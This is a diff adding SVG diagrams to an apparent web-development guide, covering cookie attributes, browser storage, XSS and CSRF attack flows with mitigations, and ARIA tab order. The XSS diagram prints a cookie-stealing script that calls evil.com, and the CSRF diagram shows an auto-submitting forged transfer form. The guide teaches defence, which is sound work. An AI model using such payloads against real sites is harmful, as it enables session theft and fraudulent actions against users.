+    <text x="450" y="86" text-anchor="middle" font-family="var(--f-mono)" font-size="11" font-weight="700" fill="var(--warning)">SameSite=Strict/Lax/None</text>
+    <text x="450" y="102" text-anchor="middle" font-family="var(--f-body)" font-size="10" fill="var(--fg)">Strict: blocks cross-site sends (CSRF)</text>
+    <text x="450" y="118" text-anchor="middle" font-family="var(--f-body)" font-size="10" fill="var(--fg)">Lax: top-level GET only</text>
+    <line x1="316" y1="68" x2="340" y2="85" stroke="var(--warning)" stroke-width="1" stroke-dasharray="3 2"/>
+    <!-- Path -->
+    <rect x="580" y="68" width="220" height="44" rx="6" fill="var(--surface-alt)" stroke="var(--border)" stroke-width="1"/>
+    <text x="690" y="86" text-anchor="middle" font-family="var(--f-mono)" font-size="11" font-weight="700" fill="var(--fg)">Path=/</text>
+    <text x="690" y="102" text-anchor="middle" font-family="var(--f-body)" font-size="10" fill="var(--fg)">Sent for all paths on this domain</text>
+    <line x1="316" y1="70" x2="580" y2="82" stroke="var(--border)" stroke-width="1" stroke-dasharray="3 2"/>
+    <!-- Domain -->
+    <rect x="340" y="148" width="220" height="44" rx="6" fill="var(--surface-alt)" stroke="var(--border)" stroke-width="1"/>
+    <text x="450" y="166" text-anchor="middle" font-family="var(--f-mono)" font-size="11" font-weight="700" fill="var(--fg)">Domain=example.com</text>
+    <text x="450" y="182" text-anchor="middle" font-family="var(--f-body)" font-size="10" fill="var(--fg)">Also sent to subdomains if set</text>
+    <line x1="316" y1="80" x2="340" y2="162" stroke="var(--border)" stroke-width="1" stroke-dasharray="3 2"/>
+    <!-- Expires/Max-Age -->
+    <rect x="580" y="148" width="220" height="44" rx="6" fill="var(--surface-alt)" stroke="var(--border)" stroke-width="1"/>
+    <text x="690" y="166" text-anchor="middle" font-family="var(--f-mono)" font-size="11" font-weight="700" fill="var(--fg)">Max-Age=3600 / Expires</text>
+    <text x="690" y="182" text-anchor="middle" font-family="var(--f-body)" font-size="10" fill="var(--fg)">Cookie lifetime; omit = session cookie</text>
+    <line x1="316" y1="82" x2="580" y2="165" stroke="var(--border)" stroke-width="1" stroke-dasharray="3 2"/>
+    <!-- Summary row -->
+    <rect x="16" y="218" width="788" height="40" rx="6" fill="var(--bg-raised)" stroke="var(--border)" stroke-width="1"/>
+    <text x="30" y="232" font-family="var(--f-body)" font-size="11" font-weight="700" fill="var(--danger)">XSS protection:</text>
+    <text x="140" y="232" font-family="var(--f-mono)" font-size="10" fill="var(--fg)">HttpOnly</text>
+    <text x="30" y="248" font-family="var(--f-body)" font-size="11" font-weight="700" fill="var(--warning)">CSRF protection:</text>
+    <text x="145" y="248" font-family="var(--f-mono)" font-size="10" fill="var(--fg)">SameSite=Strict</text>
+    <text x="340" y="232" font-family="var(--f-body)" font-size="11" font-weight="700" fill="var(--accent)">MITM protection:</text>
+    <text x="455" y="232" font-family="var(--f-mono)" font-size="10" fill="var(--fg)">Secure</text>
+    <text x="340" y="248" font-family="var(--f-body)" font-size="11" font-weight="700" fill="var(--fg-muted)">Combined recommendation:</text>
+    <text x="510" y="248" font-family="var(--f-mono)" font-size="10" fill="var(--fg)">HttpOnly; Secure; SameSite=Strict</text>
+  </svg>
+  <figcaption>Cookie attributes and what each one blocks: HttpOnly stops JS reading (XSS), Secure enforces HTTPS, SameSite=Strict prevents cross-site transmission (CSRF).</figcaption>
+</figure>
 
 <h3 class="g-h3">Cookie Attributes</h3>
 
@@ -675,6 +1007,60 @@ document.cookie  // "sessionId=a3f8b2c9d4e5" ← stolen!
 </ul>
 
 <h2 class="g-h2">6. Web Storage: localStorage vs sessionStorage vs Cookies</h2>
+
+<!-- DIAGRAM 7: localStorage vs sessionStorage vs cookies -->
+<figure class="fig-dia">
+  <svg viewBox="0 0 830 266" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Three-column comparison of localStorage, sessionStorage, and cookies">
+    <!-- Column headers -->
+    <rect x="16" y="8" width="250" height="40" rx="6" fill="var(--accent)" fill-opacity="0.18" stroke="var(--accent)" stroke-width="1.5"/>
+    <text x="141" y="33" text-anchor="middle" font-family="var(--f-body)" font-size="13" font-weight="700" fill="var(--accent)">localStorage</text>
+    <rect x="284" y="8" width="250" height="40" rx="6" fill="var(--warning)" fill-opacity="0.14" stroke="var(--warning)" stroke-width="1.5"/>
+    <text x="409" y="33" text-anchor="middle" font-family="var(--f-body)" font-size="13" font-weight="700" fill="var(--warning)">sessionStorage</text>
+    <rect x="552" y="8" width="252" height="40" rx="6" fill="var(--success)" fill-opacity="0.14" stroke="var(--success)" stroke-width="1.5"/>
+    <text x="678" y="33" text-anchor="middle" font-family="var(--f-body)" font-size="13" font-weight="700" fill="var(--success)">Cookies</text>
+    <!-- Row: Size limit -->
+    <rect x="16" y="56" width="250" height="32" rx="3" fill="var(--surface)" stroke="var(--border)" stroke-width="1"/>
+    <text x="141" y="77" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">~5 MB</text>
+    <rect x="284" y="56" width="250" height="32" rx="3" fill="var(--surface)" stroke="var(--border)" stroke-width="1"/>
+    <text x="409" y="77" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">~5 MB</text>
+    <rect x="552" y="56" width="252" height="32" rx="3" fill="var(--surface)" stroke="var(--border)" stroke-width="1"/>
+    <text x="678" y="77" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">~4 KB</text>
+    <text x="-5" y="77" font-family="var(--f-body)" font-size="10" fill="var(--fg-subtle)" text-anchor="end">Size</text>
+    <!-- Row: Lifetime -->
+    <rect x="16" y="96" width="250" height="32" rx="3" fill="var(--surface-alt)" stroke="var(--border)" stroke-width="1"/>
+    <text x="141" y="117" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">Until cleared manually</text>
+    <rect x="284" y="96" width="250" height="32" rx="3" fill="var(--surface-alt)" stroke="var(--border)" stroke-width="1"/>
+    <text x="409" y="117" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">Until tab closes</text>
+    <rect x="552" y="96" width="252" height="32" rx="3" fill="var(--surface-alt)" stroke="var(--border)" stroke-width="1"/>
+    <text x="678" y="117" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">Set by Max-Age / Expires</text>
+    <text x="-5" y="117" font-family="var(--f-body)" font-size="10" fill="var(--fg-subtle)" text-anchor="end">Lifetime</text>
+    <!-- Row: Sent with requests -->
+    <rect x="16" y="136" width="250" height="32" rx="3" fill="var(--surface)" stroke="var(--border)" stroke-width="1"/>
+    <text x="141" y="157" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--danger)">No</text>
+    <rect x="284" y="136" width="250" height="32" rx="3" fill="var(--surface)" stroke="var(--border)" stroke-width="1"/>
+    <text x="409" y="157" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--danger)">No</text>
+    <rect x="552" y="136" width="252" height="32" rx="3" fill="var(--surface)" stroke="var(--border)" stroke-width="1"/>
+    <text x="678" y="157" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--success)">Yes (automatically)</text>
+    <text x="-5" y="157" font-family="var(--f-body)" font-size="10" fill="var(--fg-subtle)" text-anchor="end">Auto-sent</text>
+    <!-- Row: Scriptable -->
+    <rect x="16" y="176" width="250" height="32" rx="3" fill="var(--surface-alt)" stroke="var(--border)" stroke-width="1"/>
+    <text x="141" y="197" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--success)">Yes — JS</text>
+    <rect x="284" y="176" width="250" height="32" rx="3" fill="var(--surface-alt)" stroke="var(--border)" stroke-width="1"/>
+    <text x="409" y="197" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--success)">Yes — JS</text>
+    <rect x="552" y="176" width="252" height="32" rx="3" fill="var(--surface-alt)" stroke="var(--border)" stroke-width="1"/>
+    <text x="678" y="197" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--warning)">Yes unless HttpOnly</text>
+    <text x="-5" y="197" font-family="var(--f-body)" font-size="10" fill="var(--fg-subtle)" text-anchor="end">JS access</text>
+    <!-- Row: Server-set -->
+    <rect x="16" y="216" width="250" height="32" rx="3" fill="var(--surface)" stroke="var(--border)" stroke-width="1"/>
+    <text x="141" y="237" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--danger)">No</text>
+    <rect x="284" y="216" width="250" height="32" rx="3" fill="var(--surface)" stroke="var(--border)" stroke-width="1"/>
+    <text x="409" y="237" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--danger)">No</text>
+    <rect x="552" y="216" width="252" height="32" rx="3" fill="var(--surface)" stroke="var(--border)" stroke-width="1"/>
+    <text x="678" y="237" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--success)">Yes (Set-Cookie header)</text>
+    <text x="-5" y="237" font-family="var(--f-body)" font-size="10" fill="var(--fg-subtle)" text-anchor="end">Server-set</text>
+  </svg>
+  <figcaption>Key differences at a glance: only cookies are sent automatically with requests and can be set by the server; localStorage outlives the session while sessionStorage clears on tab close.</figcaption>
+</figure>
 
 <h3 class="g-h3">Comparison Table</h3>
 
@@ -1226,6 +1612,72 @@ event.stopImmediatePropagation();</pre></div>
 
 <h2 class="g-h2">11. Security: XSS &amp; CSRF</h2>
 
+<!-- DIAGRAM 8: XSS attack flow -->
+<figure class="fig-dia">
+  <svg viewBox="0 0 830 320" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="XSS attack flow: attacker injects script into user content, browser executes it, cookie is stolen. Mitigations shown on right.">
+    <defs>
+      <marker id="arr8r" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
+        <path d="M0,0 L8,4 L0,8 z" fill="var(--danger)"/>
+      </marker>
+      <marker id="arr8g" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
+        <path d="M0,0 L8,4 L0,8 z" fill="var(--success)"/>
+      </marker>
+    </defs>
+    <!-- Attack title -->
+    <text x="16" y="20" font-family="var(--f-body)" font-size="12" font-weight="700" fill="var(--danger)">XSS Attack</text>
+    <!-- Step 1: attacker -->
+    <rect x="16" y="30" width="120" height="40" rx="6" fill="var(--surface)" stroke="var(--danger)" stroke-width="1.5"/>
+    <text x="76" y="55" text-anchor="middle" font-family="var(--f-body)" font-size="11" fill="var(--danger)">Attacker</text>
+    <!-- Arrow to DB/Server -->
+    <line x1="136" y1="50" x2="220" y2="50" stroke="var(--danger)" stroke-width="1.5" marker-end="url(#arr8r)"/>
+    <text x="178" y="44" text-anchor="middle" font-family="var(--f-mono)" font-size="9" fill="var(--danger)">POST comment:</text>
+    <!-- Script snippet -->
+    <rect x="220" y="30" width="260" height="40" rx="6" fill="var(--danger)" fill-opacity="0.08" stroke="var(--danger)" stroke-width="1.5"/>
+    <text x="350" y="48" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--danger)">&lt;script&gt;fetch('evil.com?c='</text>
+    <text x="350" y="64" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--danger)">+document.cookie)&lt;/script&gt;</text>
+    <!-- Arrow to server DB -->
+    <line x1="480" y1="50" x2="550" y2="50" stroke="var(--danger)" stroke-width="1.5" marker-end="url(#arr8r)"/>
+    <text x="515" y="44" text-anchor="middle" font-family="var(--f-mono)" font-size="9" fill="var(--fg-muted)">saved in DB</text>
+    <rect x="550" y="30" width="100" height="40" rx="6" fill="var(--surface-alt)" stroke="var(--border)" stroke-width="1.5"/>
+    <text x="600" y="55" text-anchor="middle" font-family="var(--f-body)" font-size="11" fill="var(--fg)">Server DB</text>
+    <!-- Step 2: victim loads page -->
+    <rect x="16" y="110" width="120" height="40" rx="6" fill="var(--surface)" stroke="var(--warning)" stroke-width="1.5"/>
+    <text x="76" y="135" text-anchor="middle" font-family="var(--f-body)" font-size="11" fill="var(--warning)">Victim browser</text>
+    <!-- Arrow GET page -->
+    <line x1="136" y1="130" x2="550" y2="50" stroke="var(--warning)" stroke-width="1" stroke-dasharray="4 3" marker-end="url(#arr8r)"/>
+    <text x="310" y="84" text-anchor="middle" font-family="var(--f-mono)" font-size="9" fill="var(--warning)">GET page (server returns HTML with injected script)</text>
+    <!-- Step 3: browser executes -->
+    <rect x="160" y="110" width="280" height="40" rx="6" fill="var(--danger)" fill-opacity="0.10" stroke="var(--danger)" stroke-width="1.5"/>
+    <text x="300" y="125" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--danger)">Browser executes injected &lt;script&gt;</text>
+    <text x="300" y="141" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--danger)">in victim's origin context</text>
+    <line x1="136" y1="130" x2="160" y2="130" stroke="var(--danger)" stroke-width="1.5" marker-end="url(#arr8r)"/>
+    <!-- Step 4: cookie stolen -->
+    <line x1="76" y1="150" x2="76" y2="175" stroke="var(--danger)" stroke-width="1.5" marker-end="url(#arr8r)"/>
+    <rect x="16" y="175" width="200" height="40" rx="6" fill="var(--danger)" fill-opacity="0.15" stroke="var(--danger)" stroke-width="1.5"/>
+    <text x="116" y="199" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--danger)">Cookie sent to evil.com</text>
+    <!-- Mitigations panel -->
+    <rect x="490" y="95" width="314" height="200" rx="6" fill="var(--success)" fill-opacity="0.08" stroke="var(--success)" stroke-width="1.5"/>
+    <text x="647" y="116" text-anchor="middle" font-family="var(--f-body)" font-size="12" font-weight="700" fill="var(--success)">Mitigations</text>
+    <text x="506" y="138" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">textContent</text>
+    <text x="600" y="138" font-family="var(--f-body)" font-size="11" fill="var(--fg-muted)">— never innerHTML with user data</text>
+    <text x="506" y="160" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">CSP header</text>
+    <text x="600" y="160" font-family="var(--f-body)" font-size="11" fill="var(--fg-muted)">— blocks inline scripts</text>
+    <text x="506" y="182" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">HttpOnly</text>
+    <text x="590" y="182" font-family="var(--f-body)" font-size="11" fill="var(--fg-muted)">— cookie unreadable by JS</text>
+    <text x="506" y="204" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">DOMPurify</text>
+    <text x="598" y="204" font-family="var(--f-body)" font-size="11" fill="var(--fg-muted)">— sanitise before innerHTML</text>
+    <text x="506" y="226" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">JSX {text}</text>
+    <text x="594" y="226" font-family="var(--f-body)" font-size="11" fill="var(--fg-muted)">— React escapes by default</text>
+    <text x="506" y="248" font-family="var(--f-mono)" font-size="11" fill="var(--fg)">Trusted Types</text>
+    <text x="608" y="248" font-family="var(--f-body)" font-size="11" fill="var(--fg-muted)">— enforce safe DOM APIs</text>
+    <!-- Outcome note -->
+    <rect x="16" y="234" width="460" height="32" rx="6" fill="var(--bg-raised)" stroke="var(--border)" stroke-width="1"/>
+    <text x="236" y="255" text-anchor="middle" font-family="var(--f-body)" font-size="11" fill="var(--fg)">Result: attacker reads session cookie, impersonates victim on the site</text>
+    <text x="236" y="290" text-anchor="middle" font-family="var(--f-body)" font-size="11" fill="var(--fg-muted)">XSS executes code IN the legitimate origin — the browser trusts it fully</text>
+  </svg>
+  <figcaption>XSS: attacker stores a malicious script in the database; when a victim loads the page, their browser executes the script, which can steal cookies or perform actions on their behalf.</figcaption>
+</figure>
+
 <h3 class="g-h3">XSS (Cross-Site Scripting)</h3>
 
 <p><strong>What it is:</strong> An attacker injects malicious JavaScript into a web page that is then executed in other users' browsers.</p>
@@ -1277,6 +1729,66 @@ function DangerousComment({ html }) {
   return &lt;p dangerouslySetInnerHTML={{ __html: html }} /&gt;;
   // Only use when html comes from a trusted, sanitized source (e.g., DOMPurify)
 }</pre></div>
+
+<!-- DIAGRAM 9: CSRF attack -->
+<figure class="fig-dia">
+  <svg viewBox="0 0 830 310" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="CSRF attack: attacker page silently POSTs to victim-bank.com with victim's cookie. Mitigations: SameSite=Strict, CSRF token.">
+    <defs>
+      <marker id="arr9r" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
+        <path d="M0,0 L8,4 L0,8 z" fill="var(--danger)"/>
+      </marker>
+      <marker id="arr9g" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
+        <path d="M0,0 L8,4 L0,8 z" fill="var(--success)"/>
+      </marker>
+    </defs>
+    <!-- Attack label -->
+    <text x="16" y="20" font-family="var(--f-body)" font-size="12" font-weight="700" fill="var(--danger)">CSRF Attack</text>
+    <!-- evil.com page -->
+    <rect x="16" y="32" width="180" height="80" rx="6" fill="var(--danger)" fill-opacity="0.10" stroke="var(--danger)" stroke-width="1.5"/>
+    <text x="106" y="52" text-anchor="middle" font-family="var(--f-body)" font-size="11" font-weight="700" fill="var(--danger)">evil.com page</text>
+    <text x="106" y="70" text-anchor="middle" font-family="var(--f-mono)" font-size="9" fill="var(--fg)">&lt;form action="bank.com/transfer"</text>
+    <text x="106" y="83" text-anchor="middle" font-family="var(--f-mono)" font-size="9" fill="var(--fg)">  amount=10000&gt;&lt;/form&gt;</text>
+    <text x="106" y="98" text-anchor="middle" font-family="var(--f-mono)" font-size="9" fill="var(--fg)">&lt;script&gt;form.submit()&lt;/script&gt;</text>
+    <!-- Victim browser -->
+    <rect x="16" y="140" width="180" height="40" rx="6" fill="var(--surface)" stroke="var(--warning)" stroke-width="1.5"/>
+    <text x="106" y="165" text-anchor="middle" font-family="var(--f-body)" font-size="11" fill="var(--warning)">Victim's Browser</text>
+    <text x="106" y="200" text-anchor="middle" font-family="var(--f-mono)" font-size="9" fill="var(--fg-muted)">(already logged into bank.com)</text>
+    <!-- Auto-POST arrow -->
+    <line x1="196" y1="165" x2="350" y2="165" stroke="var(--danger)" stroke-width="2" marker-end="url(#arr9r)"/>
+    <text x="273" y="155" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--danger)">POST /transfer</text>
+    <text x="273" y="170" text-anchor="middle" font-family="var(--f-mono)" font-size="9" fill="var(--danger)">Cookie: sid=abc (auto-sent!)</text>
+    <!-- Bank server -->
+    <rect x="350" y="140" width="160" height="40" rx="6" fill="var(--surface-alt)" stroke="var(--border-strong)" stroke-width="1.5"/>
+    <text x="430" y="165" text-anchor="middle" font-family="var(--f-body)" font-size="11" fill="var(--fg)">bank.com server</text>
+    <!-- Result -->
+    <rect x="350" y="198" width="160" height="32" rx="3" fill="var(--danger)" fill-opacity="0.15" stroke="var(--danger)" stroke-width="1"/>
+    <text x="430" y="219" text-anchor="middle" font-family="var(--f-mono)" font-size="11" fill="var(--danger)">Transfer executed!</text>
+    <line x1="430" y1="180" x2="430" y2="198" stroke="var(--danger)" stroke-width="1.5" marker-end="url(#arr9r)"/>
+    <!-- Mitigations -->
+    <rect x="540" y="8" width="268" height="280" rx="6" fill="var(--success)" fill-opacity="0.08" stroke="var(--success)" stroke-width="1.5"/>
+    <text x="674" y="30" text-anchor="middle" font-family="var(--f-body)" font-size="12" font-weight="700" fill="var(--success)">Mitigations</text>
+    <!-- SameSite -->
+    <rect x="556" y="42" width="236" height="60" rx="4" fill="var(--surface)" stroke="var(--warning)" stroke-width="1"/>
+    <text x="674" y="58" text-anchor="middle" font-family="var(--f-mono)" font-size="11" font-weight="700" fill="var(--warning)">SameSite=Strict</text>
+    <text x="674" y="74" text-anchor="middle" font-family="var(--f-body)" font-size="10" fill="var(--fg)">Browser refuses to send cookie on</text>
+    <text x="674" y="88" text-anchor="middle" font-family="var(--f-body)" font-size="10" fill="var(--fg)">cross-site requests. Attacker blocked.</text>
+    <!-- CSRF token -->
+    <rect x="556" y="116" width="236" height="76" rx="4" fill="var(--surface)" stroke="var(--accent)" stroke-width="1"/>
+    <text x="674" y="132" text-anchor="middle" font-family="var(--f-mono)" font-size="11" font-weight="700" fill="var(--accent)">CSRF Token</text>
+    <text x="674" y="148" text-anchor="middle" font-family="var(--f-body)" font-size="10" fill="var(--fg)">Server embeds secret token in form.</text>
+    <text x="674" y="162" text-anchor="middle" font-family="var(--f-body)" font-size="10" fill="var(--fg)">Attacker cannot read it (no JS access).</text>
+    <text x="674" y="178" text-anchor="middle" font-family="var(--f-body)" font-size="10" fill="var(--fg)">Server rejects POST without valid token.</text>
+    <!-- Double-submit -->
+    <rect x="556" y="206" width="236" height="56" rx="4" fill="var(--surface)" stroke="var(--border)" stroke-width="1"/>
+    <text x="674" y="222" text-anchor="middle" font-family="var(--f-mono)" font-size="11" font-weight="700" fill="var(--fg)">Double-Submit Cookie</text>
+    <text x="674" y="238" text-anchor="middle" font-family="var(--f-body)" font-size="10" fill="var(--fg)">Token in both cookie AND body.</text>
+    <text x="674" y="252" text-anchor="middle" font-family="var(--f-body)" font-size="10" fill="var(--fg)">Attacker cannot match them.</text>
+    <!-- Origin check -->
+    <rect x="556" y="272" width="236" height="24" rx="4" fill="var(--surface)" stroke="var(--border)" stroke-width="1"/>
+    <text x="674" y="288" text-anchor="middle" font-family="var(--f-body)" font-size="10" fill="var(--fg)">Check Origin / Referer headers</text>
+  </svg>
+  <figcaption>CSRF exploits the browser's automatic cookie sending. The victim's own cookie authenticates the attacker's request. SameSite=Strict and CSRF tokens both break this chain.</figcaption>
+</figure>
 
 <h3 class="g-h3">CSRF (Cross-Site Request Forgery)</h3>
 
@@ -1451,6 +1963,80 @@ if (request.headers.get('origin') !== 'https://bank.com') {
 &lt;button type="button" aria-label="Delete item" onClick={() =&gt; deleteItem(id)}&gt;
   &lt;TrashIcon aria-hidden="true" /&gt;  {/* hide icon from screen reader — label already describes it */}
 &lt;/button&gt;</pre></div>
+
+<!-- DIAGRAM 10: ARIA + keyboard navigation tab order -->
+<figure class="fig-dia">
+  <svg viewBox="0 0 830 290" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Tab order diagram showing focus ring, tabindex=0 elements in order, and tabindex=-1 element reachable only programmatically">
+    <defs>
+      <marker id="arr10" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
+        <path d="M0,0 L8,4 L0,8 z" fill="var(--accent)"/>
+      </marker>
+      <marker id="arr10g" viewBox="0 0 8 8" refX="7" refY="4" markerWidth="8" markerHeight="8" orient="auto-start-reverse">
+        <path d="M0,0 L8,4 L0,8 z" fill="var(--success)"/>
+      </marker>
+    </defs>
+    <!-- Title -->
+    <text x="16" y="20" font-family="var(--f-body)" font-size="12" font-weight="700" fill="var(--fg)">Tab key order through the page</text>
+    <!-- Tab 1: link -->
+    <rect x="16" y="36" width="140" height="56" rx="6" fill="var(--surface)" stroke="var(--accent)" stroke-width="3"/>
+    <!-- Focus ring indicator -->
+    <rect x="9" y="29" width="154" height="70" rx="9" fill="none" stroke="var(--accent)" stroke-width="1.5" stroke-dasharray="4 2"/>
+    <text x="86" y="56" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-muted)">&lt;a href="/home"&gt;</text>
+    <text x="86" y="74" text-anchor="middle" font-family="var(--f-body)" font-size="12" font-weight="700" fill="var(--accent)">Home link</text>
+    <text x="86" y="118" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-subtle)">Tab 1  (tabindex implicit)</text>
+    <!-- Tab arrow 1→2 -->
+    <line x1="156" y1="64" x2="220" y2="64" stroke="var(--accent)" stroke-width="2" marker-end="url(#arr10)"/>
+    <text x="188" y="58" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--accent)">Tab</text>
+    <!-- Tab 2: button tabindex="0" -->
+    <rect x="220" y="36" width="160" height="56" rx="6" fill="var(--surface)" stroke="var(--border-strong)" stroke-width="1.5"/>
+    <text x="300" y="56" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-muted)">&lt;div role="button"</text>
+    <text x="300" y="70" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-muted)">tabindex="0"&gt;</text>
+    <text x="300" y="86" text-anchor="middle" font-family="var(--f-body)" font-size="11" fill="var(--fg)">Custom Button</text>
+    <text x="300" y="118" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-subtle)">Tab 2  (tabindex="0")</text>
+    <!-- Tab arrow 2→3 -->
+    <line x1="380" y1="64" x2="444" y2="64" stroke="var(--accent)" stroke-width="2" marker-end="url(#arr10)"/>
+    <text x="412" y="58" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--accent)">Tab</text>
+    <!-- Tab 3: input -->
+    <rect x="444" y="36" width="140" height="56" rx="6" fill="var(--surface)" stroke="var(--border-strong)" stroke-width="1.5"/>
+    <text x="514" y="56" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-muted)">&lt;input type="text"&gt;</text>
+    <text x="514" y="74" text-anchor="middle" font-family="var(--f-body)" font-size="11" fill="var(--fg)">Name field</text>
+    <text x="514" y="118" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-subtle)">Tab 3  (tabindex implicit)</text>
+    <!-- tabindex=-1 element, shown below, not in order -->
+    <rect x="640" y="36" width="164" height="76" rx="6" fill="var(--surface-alt)" stroke="var(--border)" stroke-width="1.5" stroke-dasharray="6 3"/>
+    <text x="722" y="56" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-muted)">&lt;div id="modal"</text>
+    <text x="722" y="70" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-muted)">tabindex="-1"</text>
+    <text x="722" y="84" text-anchor="middle" font-family="var(--f-mono)" font-size="10" fill="var(--fg-muted)">role="dialog"&gt;</text>
+    <text x="722" y="100" text-anchor="middle" font-family="var(--f-body)" font-size="10" fill="var(--warning)">NOT in tab order</text>
+    <!-- JS focus arrow -->
+    <line x1="584" y1="75" x2="640" y2="75" stroke="var(--warning)" stroke-width="1.5" stroke-dasharray="4 3" marker-end="url(#arr10)"/>
+    <text x="612" y="68" text-anchor="middle" font-family="var(--f-mono)" font-size="9" fill="var(--warning)">.focus()</text>
+    <text x="722" y="130" text-anchor="middle" font-family="var(--f-mono)" font-size="9" fill="var(--fg-muted)">reachable via JS only</text>
+    <!-- ARIA annotation section -->
+    <rect x="16" y="148" width="788" height="120" rx="6" fill="var(--bg-raised)" stroke="var(--border)" stroke-width="1"/>
+    <text x="30" y="168" font-family="var(--f-body)" font-size="11" font-weight="700" fill="var(--fg)">Key ARIA attributes for keyboard-accessible widgets</text>
+    <!-- aria-label -->
+    <rect x="30" y="178" width="180" height="36" rx="4" fill="var(--surface)" stroke="var(--border)" stroke-width="1"/>
+    <text x="120" y="194" text-anchor="middle" font-family="var(--f-mono)" font-size="10" font-weight="700" fill="var(--accent)">aria-label="Close"</text>
+    <text x="120" y="208" text-anchor="middle" font-family="var(--f-body)" font-size="9" fill="var(--fg-muted)">accessible name for icon btn</text>
+    <!-- aria-expanded -->
+    <rect x="224" y="178" width="180" height="36" rx="4" fill="var(--surface)" stroke="var(--border)" stroke-width="1"/>
+    <text x="314" y="194" text-anchor="middle" font-family="var(--f-mono)" font-size="10" font-weight="700" fill="var(--warning)">aria-expanded="false"</text>
+    <text x="314" y="208" text-anchor="middle" font-family="var(--f-body)" font-size="9" fill="var(--fg-muted)">state of collapsible panel</text>
+    <!-- aria-live -->
+    <rect x="418" y="178" width="180" height="36" rx="4" fill="var(--surface)" stroke="var(--border)" stroke-width="1"/>
+    <text x="508" y="194" text-anchor="middle" font-family="var(--f-mono)" font-size="10" font-weight="700" fill="var(--success)">aria-live="polite"</text>
+    <text x="508" y="208" text-anchor="middle" font-family="var(--f-body)" font-size="9" fill="var(--fg-muted)">announce dynamic updates</text>
+    <!-- aria-hidden -->
+    <rect x="612" y="178" width="180" height="36" rx="4" fill="var(--surface)" stroke="var(--border)" stroke-width="1"/>
+    <text x="702" y="194" text-anchor="middle" font-family="var(--f-mono)" font-size="10" font-weight="700" fill="var(--fg-muted)">aria-hidden="true"</text>
+    <text x="702" y="208" text-anchor="middle" font-family="var(--f-body)" font-size="9" fill="var(--fg-muted)">hide decorative icon from AT</text>
+    <!-- tabindex rule -->
+    <text x="30" y="242" font-family="var(--f-body)" font-size="11" fill="var(--fg)">tabindex="0" — joins natural order at DOM position</text>
+    <text x="30" y="258" font-family="var(--f-body)" font-size="11" fill="var(--warning)">tabindex="-1" — not in Tab order; focusable only via JS .focus()</text>
+    <text x="30" y="274" font-family="var(--f-body)" font-size="11" fill="var(--danger)">tabindex="5" (positive) — avoid; creates unpredictable jump order</text>
+  </svg>
+  <figcaption>Keyboard tab order follows DOM order for native elements and tabindex="0" custom elements. tabindex="-1" lets you programmatically focus a modal without exposing it to Tab key navigation.</figcaption>
+</figure>
 
 <h3 class="g-h3">Keyboard Navigation</h3>
 
